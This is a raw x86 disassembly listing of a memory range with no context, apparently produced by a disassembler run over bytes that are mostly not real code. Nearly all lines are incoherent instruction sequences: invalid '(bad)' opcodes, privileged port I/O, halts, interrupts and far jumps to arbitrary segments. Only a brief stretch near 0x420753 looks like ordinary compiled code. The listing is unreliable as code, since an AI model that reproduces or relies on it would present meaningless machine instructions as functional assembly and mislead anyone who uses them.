  420319:	lahf   
  42031a:	add    eax,0x1081d849
  42031f:	aaa    
  420320:	adc    dh,BYTE PTR [eax+0x52]
  420323:	jns    0x4202d5
  420325:	xor    al,0xd2
  420327:	cmc    
  420328:	jae    0x4202e9
  42032a:	xor    al,0x9b
  42032c:	les    esp,FWORD PTR [esi+0x463a9eee]
  420332:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420333:	xor    al,0xfd
  420335:	in     al,0x4c
  420337:	mov    dl,0x8b
  420339:	dec    ebp
  42033a:	or     BYTE PTR [ebp-0x4806fe7c],cl
  420340:	lods   al,BYTE PTR ds:[esi]
  420341:	loopne 0x4202ce
  420343:	lea    edx,[eax]
  420345:	(bad)  
  420346:	(bad)  
  420347:	inc    DWORD PTR [ecx+0x4108e1]
  42034d:	add    BYTE PTR [ecx+0x40e7e1],al
  420353:	add    BYTE PTR [ecx+0x1a54e9],al
  420359:	add    BYTE PTR [ecx+0x25acf1],al
  42035f:	add    BYTE PTR [ebx-0x1036b],cl
  420365:	(bad)  
  420366:	jmp    0x42074d
  42036b:	pop    eax
  42036c:	dec    ecx
  42036d:	xchg   esi,eax
  42036e:	jmp    0x42030c
  420370:	cmp    al,0xbc
  420372:	jns    0x4203a4
  420374:	inc    edx
  420375:	aad    0xe3
  420377:	popa   
  420378:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420379:	test   bh,cl
  42037b:	out    dx,eax
  42037c:	popf   
  42037d:	sar    BYTE PTR [esi-0x41413bb6],0x86
  420384:	push   ecx
  420385:	rol    ecx,cl
  420387:	lods   al,BYTE PTR ds:[esi]
  420388:	popf   
  420389:	mov    al,0xba
  42038b:	and    BYTE PTR ds:0x6c1468d,al
  420391:	call   0x9bc167c9
  420396:	std    
  420397:	cs int 0xf
  42039a:	fsub   DWORD PTR [eax]
  42039c:	dec    ebx
  42039d:	mov    ah,0x76
  42039f:	int3   
  4203a0:	std    
  4203a1:	neg    DWORD PTR [ecx+0x4f]
  4203a4:	pop    edx
  4203a5:	xor    BYTE PTR [edi],ah
  4203a7:	sbb    eax,0x443adbef
  4203ac:	int3   
  4203ad:	mov    dl,0x14
  4203af:	dec    ebp
  4203b0:	xlat   BYTE PTR ds:[ebx]
  4203b1:	outs   dx,DWORD PTR ds:[esi]
  4203b2:	fwait
  4203b3:	int3   
  4203b4:	test   al,0xe2
  4203b6:	leave  
  4203b7:	repz rcl cl,1
  4203ba:	repnz imul esp,DWORD PTR [ebp-0x24],0x16
  4203bf:	xor    eax,0x1cc8f515
  4203c4:	push   ebp
  4203c5:	out    dx,eax
  4203c6:	ror    BYTE PTR [edx+eiz*4-0x2],cl
  4203ca:	mov    esi,0x36f85098
  4203cf:	ret    
  4203d0:	(bad)  
  4203d1:	dec    ecx
  4203d2:	loope  0x42041e
  4203d4:	ins    BYTE PTR es:[edi],dx
  4203d5:	jnp    0x420399
  4203d7:	fdiv   QWORD PTR [edx-0x1f5ded83]
  4203dd:	and    al,0x9f
  4203df:	aas    
  4203e0:	lahf   
  4203e1:	jmp    0x1bcf:0xc515fb3
  4203e8:	sbb    bh,BYTE PTR [esi+0x64]
  4203eb:	frstor [edx+esi*2]
  4203ee:	lds    eax,FWORD PTR [esi+eiz*4-0x43]
  4203f2:	arpl   WORD PTR [edi+0x3c],ax
  4203f5:	mov    dl,0x74
  4203f7:	or     al,0xb5
  4203f9:	test   al,0xd2
  4203fb:	(bad)  
  4203fc:	dec    ebp
  4203fd:	loope  0x42042a
  4203ff:	cmc    
  420400:	add    edi,ecx
  420402:	dec    edx
  420403:	or     ecx,edx
  420405:	loope  0x420443
  420407:	pusha  
  420408:	mov    eax,0xd20d8b06
  42040d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42040f:	test   bl,al
  420411:	jo     0x420471
  420413:	add    DWORD PTR [eax],0x645ac0b9
  420419:	push   ebx
  42041a:	ss enter 0x3f42,0x59
  42041f:	or     dl,BYTE PTR [edx+0x24d7d5a1]
  420425:	lahf   
  420426:	mov    edi,0x5839f3be
  42042b:	ss inc esi
  42042d:	jle    0x4203cf
  42042f:	xlat   BYTE PTR ds:[ebx]
  420430:	(bad)  
  420432:	xchg   DWORD PTR [esi+0x22d223ba],eax
  420438:	xor    al,0xdb
  42043a:	fs fsubrp st(0),st
  42043d:	daa    
  42043e:	jmp    0x420468
  420440:	test   al,0xa5
  420442:	xor    al,0xf0
  420444:	and    eax,0x724e24c0
  420449:	(bad)  
  42044a:	rcr    BYTE PTR [ebx-0xe],cl
  42044d:	mov    ah,0x35
  42044f:	xchg   edi,eax
  420450:	pop    ebp
  420451:	sbb    ch,cl
  420453:	jle    0x420470
  420455:	jmp    0x74d646f7
  42045a:	cdq    
  42045b:	adc    DWORD PTR [edx],edi
  42045d:	aas    
  42045e:	mov    dh,0x39
  420460:	jmp    0x4203e7
  420462:	adc    DWORD PTR [esp+ebx*1],0xffffffb2
  420466:	and    DWORD PTR [ebx],ecx
  420468:	sbb    BYTE PTR [ebp+0x26],bh
  42046b:	add    DWORD PTR [ebx+eax*4],eax
  42046e:	jne    0x42043e
  420470:	and    ecx,esp
  420472:	push   esp
  420473:	or     BYTE PTR [edi],cl
  420475:	push   0xffffffdf
  420477:	inc    ebx
  420478:	out    0x52,eax
  42047a:	mov    al,ds:0x85b87b5
  42047f:	es test eax,0xce70445d
  420485:	std    
  420486:	mov    ah,0xde
  420488:	pop    eax
  420489:	and    ecx,ecx
  42048b:	add    DWORD PTR [eax],esi
  42048d:	out    0xb0,al
  42048f:	cld    
  420490:	ss xor dl,dl
  420493:	popa   
  420494:	pusha  
  420495:	inc    esi
  420496:	repz push ds
  420498:	out    0xe1,al
  42049a:	(bad)  
  42049b:	xchg   DWORD PTR [esi+0x14028236],ecx
  4204a1:	jg     0x420445
  4204a3:	and    DWORD PTR [edx+0x6],esi
  4204a6:	cmp    bh,BYTE PTR [edi-0x66]
  4204a9:	(bad)  
  4204aa:	jecxz  0x42045c
  4204ac:	mov    ah,0x79
  4204ae:	sbb    dl,BYTE PTR [eax]
  4204b0:	jne    0x4204ed
  4204b2:	(bad)  
  4204b3:	ror    ah,0xd3
  4204b6:	xor    ah,BYTE PTR [edi+0x75]
  4204b9:	hlt    
  4204ba:	fwait
  4204bb:	push   ecx
  4204bc:	(bad)  
  4204bd:	stc    
  4204be:	inc    ecx
  4204bf:	cmp    al,0x33
  4204c1:	aam    0xc2
  4204c3:	stc    
  4204c4:	push   ecx
  4204c5:	jb     0x420484
  4204c7:	push   edx
  4204c8:	or     bl,BYTE PTR [ebx]
  4204ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4204cb:	inc    eax
  4204cc:	dec    esi
  4204cd:	les    ecx,FWORD PTR [eax+0x11b1988c]
  4204d3:	adc    BYTE PTR [esp+edi*4],bl
  4204d6:	xchg   edi,eax
  4204d7:	pop    ecx
  4204d8:	sbb    DWORD PTR [edi+esi*1],esp
  4204db:	push   esi
  4204dc:	out    dx,al
  4204dd:	mov    al,ds:0xb4eafa84
  4204e2:	ret    
  4204e3:	dec    edi
  4204e4:	cmp    esi,ebx
  4204e6:	and    eax,ebx
  4204e8:	lock cld 
  4204ea:	inc    ax
  4204ec:	pop    ss
  4204ed:	and    BYTE PTR [ecx],dh
  4204ef:	jo     0x4204ac
  4204f1:	(bad)  
  4204f2:	fnstcw WORD PTR [edi+0x17e90180]
  4204f8:	mov    WORD PTR [ebx+edi*4-0x567f864b],gs
  4204ff:	mov    ds:0x64579a08,eax
  420504:	sub    eax,0x415a71fd
  420509:	icebp  
  42050a:	jne    0x4204c3
  42050c:	push   ss
  42050d:	mov    ebx,0x90b753b4
  420512:	add    eax,0xf549c292
  420517:	(bad)  
  420518:	mov    esi,0x34925032
  42051d:	xchg   esi,eax
  42051e:	xchg   ebp,eax
  42051f:	push   ecx
  420520:	ret    0x3dbc
  420523:	push   esp
  420524:	adc    ecx,DWORD PTR [eax-0x4c005403]
  42052a:	(bad)  
  42052c:	mov    al,0xfe
  42052e:	inc    esi
  42052f:	xor    ebx,DWORD PTR [esi-0x1d]
  420532:	cmp    eax,0x4b2f205b
  420537:	ss call 0xa2b8:0x6cd4ed0b
  42053f:	jmp    0x5ae8419b
  420544:	push   edx
  420545:	aaa    
  420546:	adc    ebx,edx
  420548:	test   bh,ah
  42054a:	xor    bh,BYTE PTR [edi]
  42054c:	nop
  42054d:	or     esi,ebx
  42054f:	daa    
  420550:	push   0xffffffa8
  420552:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420553:	mov    esi,0x3d134ab1
  420558:	out    dx,eax
  420559:	popa   
  42055a:	shl    BYTE PTR [ebx+edx*1+0x219ec4fe],1
  420561:	add    BYTE PTR [ecx+esi*2+0x67ea20b0],dl
  420568:	fcmovnb st,st(6)
  42056a:	jne    0x42059a
  42056c:	imul   esi,DWORD PTR [ebp-0x70],0x72
  420570:	int    0x30
  420572:	retf   
  420573:	fs mov ch,0x8e
  420576:	cs push esi
  420578:	aam    0x35
  42057a:	push   ecx
  42057b:	mov    edi,0x507facf5
  420580:	push   ds
  420581:	push   eax
  420582:	daa    
  420583:	mov    DWORD PTR [edx-0x5ccc3f68],ecx
  420589:	mov    al,0x38
  42058c:	out    0x9c,al
  42058e:	mov    al,ds:0xd0b43d09
  420593:	dec    edx
  420594:	push   edi
  420595:	fdivr  DWORD PTR [esi]
  420597:	pop    esi
  420598:	clc    
  420599:	call   0x890c:0x5a2b8ab4
  4205a0:	imul   ebp,DWORD PTR [ebx+0x7bb355f4],0xffffffb3
  4205a7:	mov    DWORD PTR [eax+0x4d],eax
  4205aa:	jae    0x4205e5
  4205ac:	xchg   BYTE PTR [eax],dh
  4205ae:	pop    ebx
  4205af:	add    DWORD PTR [ecx],0xffffffa8
  4205b2:	iret   
  4205b3:	mov    edx,ecx
  4205b5:	repz bound esp,QWORD PTR [ebp+0x30d95c4]
  4205bc:	sar    BYTE PTR [edi-0xa74a3e8],1
  4205c2:	adc    ebx,DWORD PTR ds:0xa4b37615
  4205c8:	sbb    dh,BYTE PTR [edx]
  4205ca:	retf   
  4205cb:	(bad)  
  4205cc:	push   edi
  4205cd:	push   cs
  4205ce:	in     eax,dx
  4205cf:	mov    ebx,0x721e6bac
  4205d4:	aam    0x66
  4205d6:	jge    0x42056a
  4205d8:	or     DWORD PTR [eax],esi
  4205da:	mov    ah,0x1b
  4205dc:	mov    esp,0xff84fb1f
  4205e1:	jae    0x4205c1
  4205e3:	sahf   
  4205e4:	xchg   BYTE PTR [esi+0x7676e97c],dh
  4205ea:	aaa    
  4205eb:	mov    eax,ds:0xe6c91fb3
  4205f0:	mov    esi,0x108face3
  4205f5:	inc    ebp
  4205f6:	ins    BYTE PTR es:[edi],dx
  4205f7:	jp     0x420618
  4205f9:	or     al,BYTE PTR [ecx-0x61564643]
  4205ff:	fisttp WORD PTR [esi+0x96d0b75]
  420605:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420606:	inc    ebp
  420607:	cs (bad) 
  420609:	xchg   ebp,eax
  42060a:	sub    ecx,eax
  42060c:	mov    esp,DWORD PTR [edi-0x43]
  42060f:	outs   dx,DWORD PTR ds:[esi]
  420610:	adc    eax,0x7e1160f4
  420615:	je     0x420615
  420617:	int3   
  420618:	ror    DWORD PTR [ecx+0x2f6fb10e],1
  42061e:	pop    edi
  42061f:	(bad)  
  420620:	and    al,0x8a
  420622:	sbb    DWORD PTR [ecx+0x32],eax
  420625:	jp     0x4206a4
  420627:	mov    al,0xab
  420629:	push   ecx
  42062a:	aad    0x5a
  42062c:	or     eax,0xa38a4807
  420631:	test   BYTE PTR [ebx-0x75],0x59
  420635:	adc    BYTE PTR [ebx-0x12122f3d],0xf8
  42063c:	inc    edx
  42063d:	mul    BYTE PTR [edi]
  42063f:	int3   
  420640:	pop    ebx
  420641:	les    esp,FWORD PTR [edx-0x6c]
  420644:	sbb    DWORD PTR [eax+0x3315e1b7],ecx
  42064a:	fdiv   QWORD PTR ds:0x765197ca
  420650:	jmp    0xd6e0:0xed9a4d83
  420657:	or     esi,edi
  420659:	mov    ds,WORD PTR [eax+0x579040c5]
  42065f:	scas   al,BYTE PTR es:[edi]
  420660:	test   BYTE PTR [esi+0x65],ah
  420663:	sbb    edx,esi
  420665:	push   es
  420666:	daa    
  420667:	xchg   esi,eax
  420668:	push   0x45
  42066a:	sub    esp,ebx
  42066c:	mov    WORD PTR [ebp+0x3],ds
  42066f:	in     al,0xb8
  420671:	mov    bh,dl
  420673:	push   es
  420674:	scas   al,BYTE PTR es:[edi]
  420675:	leave  
  420676:	mov    ebx,0x2a853835
  42067b:	neg    DWORD PTR [ecx]
  42067d:	xor    eax,0x3f16bfb3
  420682:	loope  0x4206a5
  420684:	in     al,0x3f
  420686:	fist   DWORD PTR [esp+edx*4-0x6191c4dc]
  42068d:	in     eax,dx
  42068e:	jl     0x420641
  420690:	add    DWORD PTR [ebp+0x59],eax
  420693:	scas   al,BYTE PTR es:[edi]
  420694:	inc    ebp
  420695:	mov    gs,WORD PTR [ebp-0xf]
  420698:	shl    eax,cl
  42069a:	or     eax,0x5e0dd3ed
  42069f:	or     al,ch
  4206a1:	scas   al,BYTE PTR es:[edi]
  4206a2:	mov    bh,0x32
  4206a4:	int    0xe3
  4206a6:	int    0x5c
  4206a8:	mov    esi,0x2bf0f6dd
  4206ad:	sbb    al,0x84
  4206af:	pusha  
  4206b0:	mov    ebx,ebx
  4206b2:	test   DWORD PTR [ecx-0x49],ebx
  4206b5:	mov    ds:0x1bb1d62,eax
  4206ba:	adc    BYTE PTR [edi-0x25],ch
  4206bd:	and    DWORD PTR [edi-0x6b],esi
  4206c0:	mov    edi,0xc5aae10b
  4206c5:	leave  
  4206c6:	adc    BYTE PTR [eax],ah
  4206c8:	jne    0x420720
  4206ca:	daa    
  4206cb:	fild   DWORD PTR [edx+0xc49f623]
  4206d1:	xor    BYTE PTR [esi],0xad
  4206d4:	xor    esi,DWORD PTR [eax+0x5637eb0a]
  4206da:	jmp    0x9d4:0xb2a4c46a
  4206e1:	mov    esi,0xcfe93e15
  4206e6:	or     esp,ecx
  4206e8:	hlt    
  4206e9:	jl     0x420757
  4206eb:	popf   
  4206ec:	pop    ebx
  4206ed:	ss push ebx
  4206ef:	mov    cl,0xc5
  4206f1:	fst    QWORD PTR [eax+0xcfa1411]
  4206f7:	mov    edx,0xa7445e90
  4206fc:	and    al,0x44
  4206fe:	or     dl,bh
  420700:	pop    ss
  420701:	jo     0x4206fb
  420703:	mov    WORD PTR [esi-0x2492102b],fs
  420709:	outs   dx,BYTE PTR ds:[esi]
  42070a:	mov    DWORD PTR [edx-0x11a0558d],esp
  420710:	inc    BYTE PTR [edi+0x5835445e]
  420716:	outs   dx,DWORD PTR ds:[esi]
  420717:	pop    ss
  420718:	sbb    ah,BYTE PTR [ebx]
  42071a:	lea    ebx,[esi-0x17fea567]
  420720:	loopne 0x420764
  420722:	push   ds
  420723:	inc    esp
  420724:	sbb    DWORD PTR [edx+0x205eb5ff],eax
  42072a:	mov    al,ds:0xfbead277
  42072f:	jns    0x420721
  420731:	mov    esi,0x8d09a21e
  420736:	xchg   esi,eax
  420737:	cmp    bh,bl
  420739:	or     DWORD PTR [edx+0x44],0x49
  42073d:	cs jge 0x420746
  420740:	push   edx
  420741:	jo     0x4207bc
  420743:	mov    al,ch
  420745:	out    dx,eax
  420746:	adc    eax,0x623337cb
  42074b:	pop    ebx
  42074c:	imul   eax,DWORD PTR [ecx+0x6ddaf2],0x0
  420753:	mov    esi,DWORD PTR [ebp-0x108]
  420759:	and    edx,esi
  42075b:	and    edx,0xe0c
  420761:	or     edx,0x5b
  420764:	mov    esi,DWORD PTR [ebp-0xe8]
  42076a:	mov    ecx,DWORD PTR [esi+ecx*1+0x1c]
  42076e:	add    ecx,eax
  420770:	lea    eax,[edx+ecx*1-0xc5b]
  420777:	mov    DWORD PTR [ebp-0xa8],eax
  42077d:	and    DWORD PTR [ebp-0x144],0x0
  420784:	jmp    0x420b7d
  420789:	mov    eax,DWORD PTR [ebp-0x144]
  42078f:	inc    eax
  420790:	mov    DWORD PTR [ebp-0x144],eax
  420796:	jmp    0x420b7d
  42079b:	daa    
  42079c:	cmp    eax,0x75b775ce
  4207a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4207a2:	(bad)  
  4207a3:	xchg   ecx,eax
  4207a4:	(bad)  
  4207a5:	dec    esi
  4207a6:	sahf   
  4207a7:	hlt    
  4207a8:	int3   
  4207a9:	stos   BYTE PTR es:[edi],al
  4207aa:	jecxz  0x420828
  4207ac:	mov    ds:0xc44abec0,eax
  4207b1:	mov    esi,0x7abf3ebe
  4207b6:	xchg   edx,eax
  4207b7:	add    ah,BYTE PTR [edi]
  4207b9:	lods   eax,DWORD PTR ds:[esi]
  4207ba:	sub    DWORD PTR [ebp+ecx*8+0x8],esp
  4207be:	ret    
  4207bf:	aam    0x1f
  4207c1:	pop    ds
  4207c2:	hlt    
  4207c3:	js     0x42080a
  4207c5:	xchg   esp,eax
  4207c6:	xlat   BYTE PTR ds:[ebx]
  4207c7:	mov    al,ds:0xe0bf1fec
  4207cc:	cmp    BYTE PTR [edi],0xbe
  4207cf:	lds    ecx,FWORD PTR [edx]
  4207d1:	adc    bl,BYTE PTR [edi+0x18660487]
  4207d7:	jmp    DWORD PTR [ecx+0x39b379eb]
  4207dd:	repz sub DWORD PTR ds:0x3d0ef3d3,0xffffffd1
  4207e5:	(bad)  
  4207e6:	leave  
  4207e7:	sub    al,0xe0
  4207e9:	arpl   WORD PTR [edi+0x4e],sp
  4207ec:	and    edx,DWORD PTR [edi]
  4207ee:	push   ss
  4207ef:	mov    eax,ds:0x5f8c6356
  4207f4:	loop   0x420783
  4207f6:	xchg   DWORD PTR [esi+0x2f],edi
  4207f9:	xchg   ecx,eax
  4207fa:	retf   
  4207fb:	dec    edi
  4207fc:	adc    eax,DWORD PTR [ecx-0x4d]
  4207ff:	xor    ch,ch
  420801:	popf   
  420802:	icebp  
  420803:	jbe    0x420877
  420805:	jmp    0x9d75:0xfd619e02
  42080c:	mov    al,ds:0x7790f295
  420811:	repnz repz and dl,BYTE PTR [ebx-0x7f]
  420816:	scas   al,BYTE PTR es:[edi]
  420817:	dec    ecx
  420818:	jno    0x420889
  42081a:	lds    ebx,FWORD PTR cs:[eax]
  42081d:	imul   esp,DWORD PTR [ebp+0x5f26376],0x51
  420824:	mov    ecx,0xf8d51406
  420829:	adc    edx,DWORD PTR [bp-0x6f]
  42082d:	cmc    
  42082e:	pop    ebp
  42082f:	sub    ebp,esp
  420831:	dec    ecx
  420832:	jno    0x4207d2
  420834:	in     al,0xba
  420836:	mov    al,0x33
  420838:	xlat   BYTE PTR ds:[ebx]
  420839:	fcomp  DWORD PTR [ecx+0x30904e57]
  42083f:	daa    
  420840:	lea    esi,[ebx]
  420842:	imul   ebx,ebp,0xffffffc9
  420845:	mov    ds,WORD PTR [edx+0x77]
  420848:	mov    ebp,0xa59b142b
  42084d:	and    DWORD PTR [ebx],edx
  42084f:	js     0x42082c
  420851:	push   edi
  420852:	pop    edi
  420853:	push   es
  420854:	xchg   esp,eax
  420855:	int3   
  420856:	pushf  
  420857:	rcl    BYTE PTR [ebx+0x2d125407],0x1b
  42085e:	sub    al,0x3e
  420860:	aaa    
  420861:	mov    bh,0x1
  420863:	xchg   ecx,eax
  420864:	add    cl,BYTE PTR [edi]
  420866:	into   
  420867:	push   cs
  420868:	scas   al,BYTE PTR es:[edi]
  420869:	mov    al,ds:0x88d7eae5
  42086e:	cs jecxz 0x42082f
  420871:	mov    gs,edi
  420873:	jns    0x420871
  420875:	out    0xa0,al
  420877:	stos   BYTE PTR es:[edi],al
  420878:	sub    esp,DWORD PTR [edx+esi*8+0x3e46cb59]
  42087f:	ds (bad) 
  420881:	sbb    BYTE PTR [eax],ah
  420883:	push   0xec0c4fae
  420888:	rcl    BYTE PTR [ebx+0x68ded510],cl
  42088e:	pop    es
  42088f:	adc    DWORD PTR [edx],esi
  420891:	inc    eax
  420892:	push   edi
  420893:	and    al,0x6e
  420895:	adc    al,BYTE PTR [edi+0x44]
  420898:	or     al,ch
  42089a:	fwait
  42089b:	enter  0xe4de,0x9c
  42089f:	mov    ebp,0xe6795e7e
  4208a4:	fmul   st,st(2)
  4208a6:	adc    dl,BYTE PTR [ecx+eiz*8]
  4208a9:	stos   BYTE PTR es:[edi],al
  4208aa:	xchg   BYTE PTR [eax],ah
  4208ac:	jl     0x420864
  4208ae:	cli    
  4208af:	daa    
  4208b0:	dec    ecx
  4208b1:	xor    eax,0x6b803755
  4208b6:	ficom  WORD PTR [ecx+0x3b3e0b6]
  4208bc:	mov    bl,0xee
  4208be:	dec    ebx
  4208bf:	xlat   BYTE PTR ds:[ebx]
  4208c0:	pop    ds
  4208c1:	aas    
  4208c2:	call   0x9b4af8ae
  4208c7:	imul   esp,DWORD PTR [edx+0x1b],0x1c
  4208cb:	mov    eax,ds:0x91983086
  4208d0:	push   ecx
  4208d1:	gs out 0x9e,al
  4208d4:	push   ebx
  4208d5:	retf   
  4208d6:	mov    esp,0xc23452c8
  4208db:	mov    al,0x6f
  4208dd:	jl     0x42089a
  4208df:	mov    WORD PTR [ebx],es
  4208e1:	pushf  
  4208e2:	pop    edx
  4208e3:	es int 0x1d
  4208e6:	enter  0xbee0,0xad
  4208ea:	out    dx,eax
  4208eb:	xchg   DWORD PTR [edx-0x56],ebx
  4208ee:	dec    esp
  4208ef:	test   al,0x2c
  4208f1:	dec    ebx
  4208f2:	jnp    0x420911
  4208f4:	addr16 mov bl,0x31
  4208f7:	mov    esi,0xd723178d
  4208fc:	dec    edi
  4208fd:	pop    ds
  4208fe:	into   
  4208ff:	jmp    0x42097b
  420901:	push   ebp
  420902:	mov    ebx,esi
  420904:	ins    BYTE PTR es:[edi],dx
  420905:	xchg   ebp,eax
  420906:	hlt    
  420907:	cdq    
  420908:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420909:	repnz rcl BYTE PTR [eax-0x52],cl
  42090d:	or     ebp,DWORD PTR [ecx]
  42090f:	loope  0x42091d
  420911:	xchg   DWORD PTR [edi+0x4c],esi
  420914:	pusha  
  420915:	leave  
  420916:	test   BYTE PTR [edx],dh
  420918:	ins    DWORD PTR es:[edi],dx
  420919:	adc    cl,dh
  42091b:	sbb    BYTE PTR [ecx-0x17],dl
  42091e:	or     BYTE PTR [ebx],cl
  420920:	and    al,0xf2
  420922:	mov    ebx,0xc62c884c
  420927:	pop    ds
  420928:	xchg   ecx,eax
  420929:	push   esp
  42092a:	(bad)  
  42092b:	aas    
  42092c:	mov    ss,WORD PTR [edx]
  42092e:	sbb    DWORD PTR [edx],esi
  420930:	sbb    eax,0xb5577119
  420935:	fsubr  QWORD PTR [esi-0x72bad1f8]
  42093b:	outs   dx,DWORD PTR ds:[esi]
  42093c:	pop    edx
  42093d:	mov    bh,0xd
  42093f:	stc    
  420940:	xchg   ebp,eax
  420941:	(bad)  
  420943:	pop    ss
  420944:	jne    0x420993
  420946:	pop    ss
  420947:	mov    eax,0xbf451c1a
  42094c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42094d:	mov    edi,ss
  42094f:	jl     0x42099e
  420951:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420952:	push   eax
  420953:	dec    edi
  420954:	lea    esi,[edi]
  420956:	iret   
  420957:	xchg   ebx,eax
  420958:	cdq    
  420959:	mov    esi,0x29c70b74
  42095e:	adc    bh,BYTE PTR [ebp-0x4e]
  420961:	jmp    0x698c:0x80227810
  420968:	jge    0x420943
  42096a:	push   0xc8860f93
  42096f:	js     0x4209cb
  420971:	mov    ah,0x53
  420973:	imul   ebp,DWORD PTR [eax],0x6bf7579
  420979:	les    ebp,FWORD PTR [edx]
  42097b:	push   ds
  42097c:	mov    eax,0x72a0c882
  420981:	xor    DWORD PTR [esi-0x24488916],edx
  420987:	mov    ?,WORD PTR [eax+0x68]
  42098a:	mov    ch,0x0
  42098c:	pop    ebp
  42098d:	add    DWORD PTR [ebx+0x7b7e5fce],ebp
  420993:	jle    0x4209d7
  420995:	add    ebx,DWORD PTR [ebx-0x1a243d7c]
  42099b:	or     bl,BYTE PTR [edi]
  42099d:	outs   dx,DWORD PTR ds:[esi]
  42099e:	jmp    0x33b2a0e8
  4209a3:	mov    ecx,0x58f1f44b
  4209a8:	cmp    dh,BYTE PTR [edx+0x6b]
  4209ab:	xchg   BYTE PTR [ecx+0x4a29ccc3],dl
  4209b1:	sbb    edx,edx
  4209b3:	ret    
  4209b4:	cmp    BYTE PTR [edi],dl
  4209b6:	out    0xcf,al
  4209b8:	xor    esp,DWORD PTR [eax+0x2]
  4209bb:	mov    eax,ds:0x1ee115f9
  4209c0:	scas   eax,DWORD PTR es:[edi]
  4209c1:	test   eax,0xde2781e7
  4209c6:	jmp    0x469e:0xf71302b9
  4209cd:	push   edi
  4209ce:	cmp    edx,esp
  4209d0:	je     0x420a25
  4209d2:	add    al,0x64
  4209d4:	xor    BYTE PTR [eax+0x6b],bh
  4209d7:	inc    edx
  4209d8:	popf   
  4209d9:	mov    al,ds:0x24ea021c
  4209de:	rcr    BYTE PTR [edx+0x162e1ab9],1
  4209e4:	outs   dx,BYTE PTR ds:[esi]
  4209e5:	or     BYTE PTR ds:0xe97ffff0,bh
  4209eb:	and    ch,BYTE PTR [edi]
  4209ed:	push   edi
  4209ee:	enter  0x2fdc,0x19
  4209f2:	and    bl,BYTE PTR [esi+0x19]
  4209f5:	ins    BYTE PTR es:[edi],dx
  4209f6:	pop    es
  4209f7:	sbb    bh,dl
  4209f9:	aam    0x2
  4209fb:	cmp    al,BYTE PTR [edx+eiz*8+0x7d698560]
  420a02:	dec    esp
  420a03:	push   cs
  420a04:	mov    eax,0xeab68a1c
  420a09:	retf   0xa819
  420a0c:	clc    
  420a0d:	not    BYTE PTR [ecx]
  420a0f:	loop   0x420a64
  420a11:	ret    0xf0a5
  420a14:	mov    edx,0x6e819207
  420a19:	adc    al,0x55
  420a1b:	fwait
  420a1c:	gs jmp 0x48b59f99
  420a22:	mov    ds,WORD PTR [edi+0x7e]
  420a25:	(bad)  
  420a26:	out    0xb1,al
  420a28:	loope  0x420aa1
  420a2a:	pop    eax
  420a2b:	jbe    0x420a33
  420a2d:	inc    ebx
  420a2e:	xchg   edx,eax
  420a2f:	xlat   BYTE PTR ds:[ebx]
  420a30:	hlt    
  420a31:	cmp    al,0x80
  420a33:	jmp    0xa9e9d35a
  420a38:	rcl    DWORD PTR [ebp-0x16f7a8fa],cl
  420a3e:	sbb    ebp,DWORD PTR [ecx+0x4b5867ed]
  420a44:	sub    ebp,eax
  420a46:	int3   
  420a47:	xchg   esi,eax
  420a48:	imul   ecx,DWORD PTR [ebx],0x6a
  420a4b:	mov    ah,0x6d
  420a4d:	loopne 0x420a0d
  420a4f:	jmp    FWORD PTR [esi]
  420a51:	fistp  QWORD PTR [esp+eiz*8]
  420a54:	cli    
  420a55:	push   ecx
  420a56:	xor    eax,0xec0b7ca1
  420a5b:	push   ebx
  420a5c:	pop    ecx
  420a5d:	pop    edx
  420a5e:	sti    
  420a5f:	popa   
  420a60:	dec    edi
  420a61:	cld    
  420a62:	cdq    
  420a63:	call   0xbee9:0x466521d8
  420a6a:	sbb    DWORD PTR [esp+edi*2+0x559dee2a],esp
  420a71:	mov    ch,0x5e
  420a73:	pushf  
  420a74:	loope  0x420a8c
  420a76:	and    DWORD PTR [ebx+0x1bcbefad],esp
  420a7c:	push   ebx
  420a7d:	mov    WORD PTR [esi+0x1b8a6d0d],ds
  420a83:	(bad)  
  420a84:	xchg   esi,eax
  420a85:	je     0x420a6f
  420a87:	push   es
  420a88:	iret   
  420a89:	cwde   
  420a8a:	jmp    0xa5900bd3
  420a8f:	xchg   BYTE PTR [edi+0x65c096b5],bl
  420a95:	pop    eax
  420a96:	mov    BYTE PTR [esi+eiz*1+0xd],al
  420a9a:	shl    BYTE PTR [ebp+0x649c5ed5],1
  420aa0:	lahf   
  420aa1:	mov    esi,0x3096a051
  420aa6:	sub    esi,DWORD PTR [edx-0x1ba533d1]
  420aac:	pop    ebx
  420aad:	dec    esi
  420aae:	xchg   esi,eax
  420aaf:	inc    esp
  420ab0:	out    dx,eax
  420ab1:	jmp    0xc7150f16
  420ab6:	mov    ds:0x63a20de9,al
  420abb:	stos   DWORD PTR es:[edi],eax
  420abc:	cdq    
  420abd:	retf   
  420abe:	adc    ch,BYTE PTR [ecx+0x7e]
  420ac1:	inc    edx
  420ac2:	cwde   
  420ac3:	loop   0x420b14
  420ac5:	fnsave [edx]
  420ac7:	aas    
  420ac8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ac9:	dec    edx
  420aca:	cmc    
  420acb:	sahf   
  420acc:	add    ecx,DWORD PTR [ebx]
  420ace:	xor    DWORD PTR [eax+0x4eeb552e],esp
  420ad4:	in     al,0xc2
  420ad6:	inc    DWORD PTR [edx+0x58a8b218]
  420adc:	pop    ecx
  420add:	mov    edx,gs
  420adf:	jne    0x420b3e
  420ae1:	mov    al,0x8f
  420ae3:	sbb    ch,bl
  420ae5:	lock push 0x7785f925
  420aeb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420aec:	xchg   esp,eax
  420aed:	arpl   WORD PTR [ebx-0x45ba6466],bx
  420af3:	and    eax,0xdfcdecb1
  420af8:	pusha  
  420af9:	push   ebp
  420afa:	arpl   cx,dx
  420afc:	ror    DWORD PTR [eax],1
  420afe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420aff:	and    BYTE PTR [edx-0xd93701e],0xef
  420b06:	xor    al,0x44
